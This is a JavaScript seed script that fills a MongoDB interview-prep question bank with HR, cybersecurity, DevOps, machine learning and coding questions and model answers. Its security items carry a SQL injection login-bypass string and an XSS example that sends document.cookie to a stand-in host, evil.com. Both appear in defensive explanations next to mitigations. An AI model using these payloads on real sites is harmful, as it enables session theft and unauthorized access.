import mongoose from "mongoose";
import { configDotenv } from "dotenv";
import QuestionBank from "../src/models/questionBankModel.js";

configDotenv();

const comprehensiveQuestions = [
  // ── HUMAN RESOURCES (HR / BEHAVIORAL) ───────────────────────────────────────
  {
    problemName: "Why Should We Hire You Over Other Qualified Candidates?",
    category: "Human Resources (HR)",
    subCategory: "Value Proposition & Culture Fit",
    importance: "high",
    difficulty: "Medium",
    hasCodeEditor: false,
    description: `This question is designed to assess your self-awareness, unique value proposition, understanding of the company's tech stack and mission, and what sets you apart from equally qualified engineers.

### Core Objectives:
1. Articulate your unique blend of technical competencies, grit, and problem-solving mindset.
2. Demonstrate company alignment (how you solve their current challenges).
3. Convey enthusiasm without sounding boastful.`,
    examples: [
      {
        input: "Interviewer asks: 'We have 50 other candidates with similar degrees. Why you?'",
        output: "Structured 2-minute answer combining technical depth, fast learning velocity, and team collaboration track record.",
        explanation: "Links personal projects and previous internship impact to the team's immediate roadmap.",
      },
    ],
    constraints: [
      "Keep response between 90 and 120 seconds.",
      "Avoid generic answers like 'I work very hard' or 'I am passionate'. Back every claim with specific proof.",
    ],
    hints: [
      "Use the 'Triangle of Value': 1) Technical skills, 2) Delivery reliability, 3) Cultural contribution.",
      "Mention a specific feature or open-source initiative of the company that excites you.",
    ],
    answer: `### Recommended Answer Structure:
1. **The Hook (Technical Alignment)**: "What makes me uniquely suited for this role is not just my proficiency in full-stack scalable architectures, but my track record of taking end-to-end ownership of features."
2. **The Proof (Past Impact)**: "At my previous role/project, I optimized our MongoDB aggregation queries which slashed API latency by 45% under load. I thrive when digging deep into performance bottlenecks."
3. **The Differentiator (Fast Learner & Collaborative Communicator)**: "I adapt rapidly to new stacks, communicate trade-offs clearly, and invest in mentorship."
4. **The Tie-in**: "I see Cloudvyn is scaling its real-time AI interview streaming pipeline, and I am excited to apply my WebSocket and backend optimization skills to help accelerate your Q3 goals."`,
    solutionApproach: "Anchor your response around: 1) What you have built, 2) How you think through trade-offs, and 3) Why this specific team needs your skill set.",
    companyTags: ["Google", "Amazon", "Microsoft", "TCS", "Infosys", "Deloitte"],
    upvotes: 612,
  },
  {
    problemName: "Tell Me About a Time You Failed or Made a Serious Production Mistake",
    category: "Human Resources (HR)",
    subCategory: "Resilience & Accountability",
    importance: "high",
    difficulty: "Medium",
    hasCodeEditor: false,
    description: `Interviewers ask this question to gauge your accountability, emotional maturity, blameless post-mortem approach, and how you prevent future recurrence.

### STAR Framework Guide:
- **Situation**: A genuine mistake (e.g. deployed untested migration, caused downtime, missed an edge-case).
- **Task**: Immediate triage and stakeholder communication.
- **Action**: What did you do to rollback, patch, and analyze the root cause?
- **Result & Learning**: What guardrails (CI/CD tests, alerts, staging validation) did you implement to ensure it never happens again?`,
    examples: [
      {
        input: "Interviewer asks: 'Describe a time you shipped a bug to production.'",
        output: "Honest narrative demonstrating rapid incident containment, blameless post-mortem, and permanent CI/CD safeguards.",
        explanation: "Focuses on the learning outcome and systemic improvement.",
      },
    ],
    constraints: [
      "Never blame managers, QA, or junior teammates.",
      "Do not pick a trivial failure ('I spelled a variable wrong') or a fatal catastrophic failure that shows negligence.",
    ],
    hints: [
      "Focus 30% of your time on the incident and 70% on the response, recovery, and preventive engineering.",
    ],
    answer: `### Recommended Response (STAR Format):
- **Situation**: "During my first year as a backend engineer, I shipped an unindexed query to our user activity service that degraded database CPU utilization to 95% during peak hours."
- **Action**: "I immediately acknowledged the incident on our Slack war room, collaborated with the DevOps lead to rollback the deployment within 8 minutes, and wrote a hotfix with compound indexing."
- **Result**: "We restored 100% service health with under 10 minutes of degraded latency. I then led a blameless post-mortem and added automated query explain-plan checks in our pre-commit CI pipeline so unindexed queries fail the build automatically."`,
    solutionApproach: "Own the mistake 100%, emphasize speed of communication, blameless remediation, and the lasting engineering safeguards implemented.",
    companyTags: ["Meta", "Amazon", "Netflix", "Uber", "Stripe"],
    upvotes: 534,
  },
  {
    problemName: "Where Do You See Yourself in 3 to 5 Years?",
    category: "Human Resources (HR)",
    subCategory: "Career Ambition & Growth",
    importance: "medium",
    difficulty: "Easy",
    hasCodeEditor: false,
    description: `Assesses your ambition, long-term commitment, realistic career trajectory (Individual Contributor vs Tech Lead), and alignment with the company's growth.`,
    examples: [
      {
        input: "Interviewer asks: 'Where do you see your engineering career in 5 years?'",
        output: "Ambitious yet grounded response focused on mastering architecture, mentoring juniors, and delivering high-leverage systems.",
        explanation: "Shows stability and desire to make a lasting impact.",
      },
    ],
    constraints: ["Keep answers realistic for an engineering career ladder."],
    hints: ["Balance technical mastery (Staff/Senior IC) with team leadership and business impact."],
    answer: `### Sample Answer:
"In the next 3 to 5 years, my goal is to evolve from a strong feature contributor into a Senior Engineer and Technical Lead who shapes system architecture and mentors incoming developers. In the first 1-2 years, I want to master Cloudvyn's core domains, deliver high-impact features with zero regressions, and deepen my expertise in distributed systems. By year 4-5, I want to lead cross-functional technical initiatives, design resilient microservices, and foster high code quality standards across the engineering org."`,
    solutionApproach: "Break answer into Phase 1 (Core Execution & Domain Mastery) and Phase 2 (Architecture Leadership & Mentorship).",
    companyTags: ["Microsoft", "Google", "Amazon", "Adobe", "Cognizant"],
    upvotes: 412,
  },

  // ── CYBERSECURITY & NETWORK SECURITY ────────────────────────────────────────
  {
    problemName: "How Does SQL Injection (SQLi) Work and How Do You Prevent It?",
    category: "Cybersecurity",
    subCategory: "Application Security (OWASP Top 10)",
    importance: "high",
    difficulty: "Medium",
    hasCodeEditor: false,
    description: `Explain the mechanics of **SQL Injection (SQLi)** vulnerabilities, demonstrate an exploitable query vs a secure query, and describe multiple defense-in-depth prevention mechanisms.

### Key Concepts to Cover:
1. In-band SQLi (Error-based, UNION-based), Blind SQLi (Boolean, Time-based).
2. Prepared Statements / Parameterized Queries (how they separate code from data).
3. ORM Parameterization & Least-Privilege DB User Accounts.
4. Web Application Firewall (WAF) & Input Validation.`,
    examples: [
      {
        input: "Vulnerable input: ' OR '1'='1' --",
        output: "SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''",
        explanation: "Bypasses authentication because '1'='1' always evaluates to true, dumping the table.",
      },
    ],
    constraints: ["Demonstrate how parameterized queries pre-compile the SQL statement structure in the database."],
    hints: [
      "Why does string concatenation fail where prepared statements succeed?",
      "Mention database driver binary protocol parameter substitution.",
    ],
    answer: `### Technical Deep-Dive:
1. **How SQLi Works**: When user input is directly concatenated into a dynamic SQL string, attackers inject SQL control characters (\`'\`, \`--\`, \`;\`, \`UNION\`) to alter the AST (Abstract Syntax Tree) parsed by the database engine.
2. **Primary Defense — Parameterized Queries / Prepared Statements**:
   - The database compiles the SQL query structure *before* user parameters are bound.
   - Input is strictly treated as literal data/parameters, never as executable SQL opcodes, rendering malicious syntax inert.
\`\`\`javascript
// SECURE (Parameterized):
const query = 'SELECT * FROM users WHERE email = $1 AND password_hash = $2';
await pool.query(query, [userEmail, hashedPassword]);
\`\`\`
3. **Defense-in-Depth Layer**:
   - Use ORMs (Prisma, Mongoose, TypeORM) which parameterize queries by default.
   - Enforce Principle of Least Privilege: App DB user should not have \`DROP\`, \`GRANT\`, or \`ALTER\` permissions.
   - Input validation (allowlist regex) & WAF rate-limiting.`,
    solutionApproach: "Always highlight Parameterized Queries (Pre-compilation of SQL AST) + ORM usage + Principle of Least Privilege DB roles.",
    companyTags: ["Palo Alto Networks", "CrowdStrike", "Cloudflare", "Google", "Goldman Sachs"],
    upvotes: 489,
  },
  {
    problemName: "Explain Cross-Site Scripting (XSS) vs Cross-Site Request Forgery (CSRF)",
    category: "Cybersecurity",
    subCategory: "Web Application Defense",
    importance: "high",
    difficulty: "Medium",
    hasCodeEditor: false,
    description: `Compare and contrast **XSS (Stored, Reflected, DOM-based)** and **CSRF**. Explain the attack vectors, how attackers exploit user sessions, and modern mitigation strategies (CSP, SameSite cookies, CSRF Tokens).`,
    examples: [
      {
        input: "Attacker embeds `<script>fetch('http://evil.com/steal?c=' + document.cookie)</script>` in comment.",
        output: "Stored XSS: Every user viewing the page executes the malicious script in their authenticated context.",
        explanation: "Compromises confidential session tokens and sensitive DOM data.",
      },
    ],
    constraints: ["Contrast client-side script execution (XSS) vs unauthorized state-changing requests (CSRF)."],
    hints: ["Explain SameSite=Strict/Lax cookies and Content-Security-Policy (CSP) headers."],
    answer: `### Comparison Summary:
| Metric | XSS (Cross-Site Scripting) | CSRF (Cross-Site Request Forgery) |
|---|---|---|
| **Concept** | Attacker injects malicious JS into trusted website | Attacker tricks authenticated browser into submitting unauthorized requests |
| **Trust Model** | Exploits user's trust in a vulnerable web app | Exploits website's trust in user's browser/session |
| **Impact** | Steals cookies, keystrokes, DOM exfiltration | Performs state-changing actions (Transfer funds, Change password) |

### Mitigations:
- **For XSS**:
  1. Context-aware HTML escaping & React/Next.js default JSX sanitization.
  2. Strict **Content Security Policy (CSP)**: \`default-src 'self'; script-src 'self' https://trusted.cdn.com\`.
  3. Store auth tokens in \`HttpOnly\`, \`Secure\`, \`SameSite\` cookies so JS cannot read them.
- **For CSRF**:
  1. Set \`SameSite=Lax\` or \`SameSite=Strict\` on session cookies.
  2. Anti-CSRF Synchronizer Tokens (Double Submit Cookie or Server-validated tokens).
  3. Validate \`Origin\` and \`Referer\` request headers on mutation endpoints (\`POST\`, \`PUT\`, \`DELETE\`).`,
    solutionApproach: "Contrast what code executes where: XSS is unauthorized script execution in the client; CSRF is unauthorized state-change using the browser's credentials.",
    companyTags: ["Cloudflare", "Zscaler", "Meta", "Amazon", "Cisco"],
    upvotes: 512,
  },
  {
    problemName: "How Does the TLS 1.3 / HTTPS Handshake Work?",
    category: "Cybersecurity",
    subCategory: "Cryptography & Transport Security",
    importance: "high",
    difficulty: "Hard",
    hasCodeEditor: false,
    description: `Provide an end-to-end technical explanation of how **TLS 1.3** establishes an encrypted channel between client and server in **1 Round Trip Time (1-RTT)**.

### Key Stages to Explain:
1. **ClientHello**: Key share (Diffie-Hellman), supported cipher suites, SNI.
2. **ServerHello**: Selected cipher, server key share, Certificate & CertificateVerify, Finished message.
3. **Session Key Derivation**: Symmetric key encryption (AES-GCM / ChaCha20-Poly1305) for HTTP payload.
4. Perfect Forward Secrecy (PFS).`,
    examples: [
      {
        input: "Browser navigates to `https://cloudvyn.com`",
        output: "TLS 1.3 Handshake completed in 1-RTT, encrypting all HTTP/2 / HTTP/3 frames with ephemeral session keys.",
        explanation: "Guarantees confidentiality, integrity, and authenticity.",
      },
    ],
    constraints: ["Explain how Ephemeral Diffie-Hellman (ECDHE) guarantees Perfect Forward Secrecy."],
    hints: ["Contrast TLS 1.2 (2-RTT) with TLS 1.3 (1-RTT with 0-RTT resumption)."],
    answer: `### Step-by-Step TLS 1.3 Handshake:
1. **ClientHello (RTT 0)**:
   - Client sends supported cipher suites (e.g. \`TLS_AES_256_GCM_SHA384\`).
   - Client generates an ephemeral Diffie-Hellman key pair and sends its **Key Share** immediately.
2. **ServerHello & Encrypted Extensions (RTT 1)**:
   - Server selects cipher suite, generates its own ephemeral DH key share, and computes the shared master secret.
   - Server sends its **X.509 Digital Certificate** signed by a trusted CA and a cryptographic signature (**CertificateVerify**).
   - Server sends a **Finished** HMAC message encrypted with the derived handshake key.
3. **Data Encryption (Application Data)**:
   - Client verifies the certificate chain and signature against its root CA store.
   - Client and Server now communicate with high-speed symmetric AEAD encryption (**AES-256-GCM** or **ChaCha20-Poly1305**).
4. **Why TLS 1.3 is Superior**:
   - Reduces latency from 2-RTT to 1-RTT.
   - Mandates **Perfect Forward Secrecy (PFS)**: Even if the server's private key is leaked in the future, past recorded sessions cannot be decrypted.`,
    solutionApproach: "Highlight: 1-RTT exchange, Ephemeral Diffie-Hellman key derivation, Certificate verification, and Perfect Forward Secrecy.",
    companyTags: ["Cloudflare", "Google", "Akamai", "Cisco", "Apple"],
    upvotes: 430,
  },

  // ── CLOUD, DEVOPS & INFRASTRUCTURE ─────────────────────────────────────────
  {
    problemName: "Explain Kubernetes Architecture (Control Plane vs Worker Nodes)",
    category: "Cloud & DevOps",
    subCategory: "Container Orchestration",
    importance: "high",
    difficulty: "Medium",
    hasCodeEditor: false,
    description: `Explain the fundamental components of **Kubernetes (K8s)** architecture, distinguishing between the **Control Plane** (Master) and **Worker Nodes**.

### Required Components:
- **Control Plane**: \`kube-apiserver\`, \`etcd\`, \`kube-scheduler\`, \`kube-controller-manager\`.
- **Worker Node**: \`kubelet\`, \`kube-proxy\`, Container Runtime (containerd/CRI-O).
- How Pod scheduling and self-healing reconciliation loops operate.`,
    examples: [
      {
        input: "`kubectl apply -f deployment.yaml`",
        output: "API Server validates schema -> writes to etcd -> Scheduler assigns Pods to healthy Worker Nodes -> Kubelet pulls image and starts containers.",
        explanation: "Reconciliation loop ensures desired state matches current state.",
      },
    ],
    constraints: ["Explain etcd's role in distributed consistency using Raft consensus."],
    hints: ["Describe how kubelet talks to the container runtime via CRI (Container Runtime Interface)."],
    answer: `### Kubernetes Architectural Breakdown:
1. **Control Plane (The Brain)**:
   - **kube-apiserver**: The central REST API gateway and admission controller. All components communicate through it.
   - **etcd**: Consistent, highly available distributed key-value store (using Raft) that stores all cluster state.
   - **kube-scheduler**: Evaluates node resource constraints, taints/tolerations, and affinity to assign newly created Pods to optimal worker nodes.
   - **kube-controller-manager**: Runs reconciliation loops (Node Controller, ReplicaSet Controller, EndpointSlice Controller) to maintain desired state.
2. **Worker Nodes (The Muscle)**:
   - **kubelet**: Node agent that communicates with the API server, instructs Container Runtime to run pods, and reports node health metrics.
   - **kube-proxy**: Manages network routing rules (iptables / IPVS) on each node to enable Service IP communication.
   - **Container Runtime**: Low-level engine (containerd / CRI-O) that unpacks and runs OCI container images.`,
    solutionApproach: "Structure into Control Plane vs Worker Nodes, explain the etcd Raft store, and walk through a pod deployment lifecycle.",
    companyTags: ["AWS", "Google Cloud", "Red Hat", "Microsoft", "Datadog"],
    upvotes: 478,
  },
  {
    problemName: "Docker Containers vs Virtual Machines: Core Differences",
    category: "Cloud & DevOps",
    subCategory: "Virtualization & OS Internals",
    importance: "medium",
    difficulty: "Easy",
    hasCodeEditor: false,
    description: `Compare containerization (Docker) and hardware virtualization (VMs). Explain Linux namespaces, cgroups, hypervisors (Type 1 vs Type 2), memory overhead, and security isolation trade-offs.`,
    examples: [
      {
        input: "Interviewer asks: 'Why is a Docker container so much lighter than a VM?'",
        output: "Docker shares the host Linux kernel and isolates processes using cgroups & namespaces; VMs emulate full hardware with a dedicated Guest OS.",
        explanation: "Results in millisecond startup times and minimal RAM overhead.",
      },
    ],
    constraints: ["Explain Linux namespaces (PID, NET, MNT) and cgroups (CPU, Memory throttling)."],
    hints: ["Contrast Hypervisor virtualization with OS-level process isolation."],
    answer: `### Core Differences:
1. **Architecture**:
   - **Virtual Machines (VMs)**: Run on a Hypervisor (VMware ESXi, KVM). Each VM contains a complete Guest OS, virtual kernel, device drivers, and binaries, consuming gigabytes of RAM.
   - **Docker Containers**: Share the Host OS kernel. Containers are isolated processes running on the host kernel using Linux **Namespaces** (PID, NET, IPC, MNT, UTS) for boundary isolation and **cgroups** for resource limits (CPU, RAM, I/O).
2. **Performance & Overhead**:
   - **Startup**: Containers start in milliseconds; VMs take 30-90 seconds to boot the guest OS.
   - **Storage/RAM**: Containers are megabytes; VMs are gigabytes.
3. **Security**: VMs offer stronger hardware-enforced hypervisor boundary isolation; containers share the host kernel so kernel vulnerabilities can potentially break container escape.`,
    solutionApproach: "Emphasize Linux primitives (Namespaces for isolation, cgroups for resource limits) vs Hypervisor hardware virtualization.",
    companyTags: ["Docker", "AWS", "Google", "VMware", "Canonical"],
    upvotes: 367,
  },

  // ── DATA SCIENCE & MACHINE LEARNING ────────────────────────────────────────
  {
    problemName: "Explain the Bias-Variance Tradeoff in Machine Learning",
    category: "Data Science & AI",
    subCategory: "Model Evaluation & Generalization",
    importance: "high",
    difficulty: "Medium",
    hasCodeEditor: false,
    description: `Explain the **Bias-Variance Tradeoff**, mathematically decomposing total generalization error into **Bias^2 + Variance + Irreducible Noise**.

### Key Points:
- Underfitting (High Bias) vs Overfitting (High Variance).
- How model complexity shifts the tradeoff curve.
- Techniques to mitigate high bias (feature engineering, deeper models) vs high variance (regularization L1/L2, dropout, cross-validation, ensemble bagging).`,
    examples: [
      {
        input: "Model has 99% training accuracy but 62% validation accuracy.",
        output: "High Variance (Overfitting): Model memorized training noise instead of generalizable patterns.",
        explanation: "Apply L2 regularization, Dropout, or collect more data.",
      },
    ],
    constraints: ["Explain how Total Error = Bias^2 + Variance + Irreducible Error."],
    hints: ["Describe how Bagging (Random Forests) reduces variance while Boosting reduces bias."],
    answer: `### Breakdown:
1. **Bias (Error from erroneous assumptions)**:
   - High Bias leads to **Underfitting**. The model is too simple to capture the underlying data patterns (e.g. fitting a linear line to quadratic data).
2. **Variance (Error from sensitivity to fluctuations in training set)**:
   - High Variance leads to **Overfitting**. The model captures random noise as genuine signal (e.g. high-degree polynomial fitting every outlier).
3. **Mathematical Decomposition**:
   $$\\text{Expected Error} = \\text{Bias}^2 + \\text{Variance} + \\sigma^2$$
4. **How to Balance**:
   - **To reduce High Bias**: Increase model complexity, add domain features, decrease regularization.
   - **To reduce High Variance**: Add L1/L2 regularization, use Dropout, apply K-Fold Cross Validation, gather more training samples, or use Ensemble Bagging (Random Forest).`,
    solutionApproach: "Define Bias vs Variance -> Give Underfitting/Overfitting intuition -> Present mathematical error decomposition -> List concrete mitigation strategies.",
    companyTags: ["OpenAI", "Google DeepMind", "Meta AI", "NVIDIA", "Amazon"],
    upvotes: 460,
  },

  // ── CODING PROBLEMS (WITH STANDALONE CODE EDITOR) ───────────────────────────
  {
    problemName: "Reverse a Singly Linked List",
    category: "Data Structures & Algorithms",
    subCategory: "Linked Lists",
    importance: "high",
    difficulty: "Easy",
    hasCodeEditor: true,
    description: `Given the \`head\` of a singly linked list, reverse the list, and return the reversed list.

### Constraints:
- The number of nodes in the list is the range \`[0, 5000]\`.
- \`-5000 <= Node.val <= 5000\`

**Follow up**: A linked list can be reversed either iteratively or recursively. Could you implement both?`,
    examples: [
      {
        input: "head = [1,2,3,4,5]",
        output: "[5,4,3,2,1]",
        explanation: "Reverses the direction of pointers between nodes.",
      },
      {
        input: "head = [1,2]",
        output: "[2,1]",
        explanation: "Pointers reversed from 1->2 to 2->1.",
      },
    ],
    constraints: ["0 <= nodes <= 5000", "-5000 <= val <= 5000"],
    hints: [
      "Maintain three pointers: prev, curr, and next.",
      "Before changing curr.next, store the next node in a temporary variable.",
    ],
    answer: `### Iterative Solution (O(N) Time, O(1) Space):
\`\`\`javascript
function reverseList(head) {
  let prev = null;
  let curr = head;
  while (curr !== null) {
    let nextTemp = curr.next;
    curr.next = prev;
    prev = curr;
    curr = nextTemp;
  }
  return prev;
}
\`\`\``,
    solutionApproach: "Iteratively track prev, curr, and nextTemp pointers to reverse pointer direction in O(N) time with O(1) auxiliary memory.",
    companyTags: ["Amazon", "Microsoft", "Apple", "Adobe", "Bloomberg"],
    upvotes: 672,
  },
  {
    problemName: "Valid Parentheses",
    category: "Data Structures & Algorithms",
    subCategory: "Stacks & Strings",
    importance: "high",
    difficulty: "Easy",
    hasCodeEditor: true,
    description: `Given a string \`s\` containing just the characters \`'('\`, \`')'\`, \`'{'\`, \`'}'\`, \`'['\` and \`']'\`, determine if the input string is valid.

An input string is valid if:
1. Open brackets must be closed by the same type of brackets.
2. Open brackets must be closed in the correct order.
3. Every close bracket has a corresponding open bracket of the same type.`,
    examples: [
      {
        input: 's = "()"',
        output: "true",
        explanation: "Parentheses match perfectly.",
      },
      {
        input: 's = "()[]{}"',
        output: "true",
        explanation: "All bracket types match in correct sequence.",
      },
      {
        input: 's = "(]"',
        output: "false",
        explanation: "Mismatched bracket types.",
      },
    ],
    constraints: ["1 <= s.length <= 10^4", "s consists of parentheses only '()[]{}'."],
    hints: ["Use a Stack (LIFO). Push open brackets onto stack; when encountering a close bracket, pop and check for match."],
    answer: `### Optimal Stack Solution (O(N) Time, O(N) Space):
\`\`\`javascript
function isValid(s) {
  const stack = [];
  const map = { ')': '(', '}': '{', ']': '[' };

  for (let char of s) {
    if (char === '(' || char === '{' || char === '[') {
      stack.push(char);
    } else {
      if (stack.length === 0 || stack.pop() !== map[char]) {
        return false;
      }
    }
  }

  return stack.length === 0;
}
\`\`\``,
    solutionApproach: "Push opening brackets onto stack. For each closing bracket, pop top of stack and verify match. Return stack.length === 0.",
    companyTags: ["Google", "Amazon", "Meta", "LinkedIn", "Spotify"],
    upvotes: 590,
  },
  {
    problemName: "Coin Change (Fewest Coins to Make Amount)",
    category: "Data Structures & Algorithms",
    subCategory: "Dynamic Programming",
    importance: "high",
    difficulty: "Medium",
    hasCodeEditor: true,
    description: `You are given an integer array \`coins\` representing coins of different denominations and an integer \`amount\` representing a total amount of money.

Return the *fewest number of coins* that you need to make up that amount. If that amount of money cannot be made up by any combination of the coins, return \`-1\`.

You may assume that you have an infinite number of each kind of coin.`,
    examples: [
      {
        input: "coins = [1,2,5], amount = 11",
        output: "3",
        explanation: "11 = 5 + 5 + 1 (3 coins total).",
      },
      {
        input: "coins = [2], amount = 3",
        output: "-1",
        explanation: "Amount 3 cannot be made with denomination 2.",
      },
    ],
    constraints: ["1 <= coins.length <= 12", "1 <= coins[i] <= 2^31 - 1", "0 <= amount <= 10^4"],
    hints: ["Use bottom-up dynamic programming: dp[i] = min(dp[i], dp[i - coin] + 1) for coin in coins."],
    answer: `### Dynamic Programming Bottom-Up (O(amount * coins.length)):
\`\`\`javascript
function coinChange(coins, amount) {
  const dp = new Array(amount + 1).fill(Infinity);
  dp[0] = 0;

  for (let i = 1; i <= amount; i++) {
    for (const coin of coins) {
      if (i - coin >= 0) {
        dp[i] = Math.min(dp[i], dp[i - coin] + 1);
      }
    }
  }

  return dp[amount] === Infinity ? -1 : dp[amount];
}
\`\`\``,
    solutionApproach: "Initialize dp array of size amount + 1 with Infinity, dp[0] = 0. Iterate from 1 to amount, updating dp[i] = min(dp[i], dp[i - coin] + 1).",
    companyTags: ["Amazon", "Uber", "Goldman Sachs", "ByteDance"],
    upvotes: 490,
  },
];

async function seed() {
  try {
    const mongoUri = process.env.db_connection_string || process.env.MONGODB_URI;
    if (!mongoUri) {
      throw new Error("db_connection_string not found in .env");
    }

    await mongoose.connect(mongoUri);
    console.log("Connected to MongoDB for Question Bank expansion...");

    let createdCount = 0;
    let updatedCount = 0;

    for (const q of comprehensiveQuestions) {
      const existing = await QuestionBank.findOne({ problemName: q.problemName });
      if (!existing) {
        await QuestionBank.create(q);
        createdCount++;
      } else {
        await QuestionBank.findByIdAndUpdate(existing._id, q, { new: true });
        updatedCount++;
      }
    }

    console.log(`Seeding complete! Created: ${createdCount}, Updated: ${updatedCount}. Total in collection: ${await QuestionBank.countDocuments()}`);
    await mongoose.disconnect();
    process.exit(0);
  } catch (err) {
    console.error("Seeding error:", err);
    process.exit(1);
  }
}

seed();
